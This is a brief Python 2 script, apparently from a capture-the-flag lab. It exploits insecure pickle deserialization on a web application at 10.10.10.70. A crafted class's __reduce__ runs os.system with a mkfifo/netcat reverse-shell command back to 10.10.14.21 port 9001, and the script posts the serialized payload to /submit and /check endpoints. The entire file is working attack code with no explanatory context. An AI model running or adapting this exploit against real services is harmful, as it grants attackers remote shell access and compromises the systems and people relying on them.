import os
import cPickle
from hashlib import md5
import requests

payload = """echo homer!; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.21 9001 >/tmp/f"""

class PickleExploit(object):
    def __reduce__(self):
        import os
        return (os.system,(payload,))

sc = cPickle.dumps(PickleExploit())
print sc
char, quote = sc.split("!")
p_id = md5(char + quote).hexdigest()

requests.post("http://10.10.10.70/submit", data={'character':char, 'quote':quote})
requests.post("http://10.10.10.70/check", data={'id':p_id})
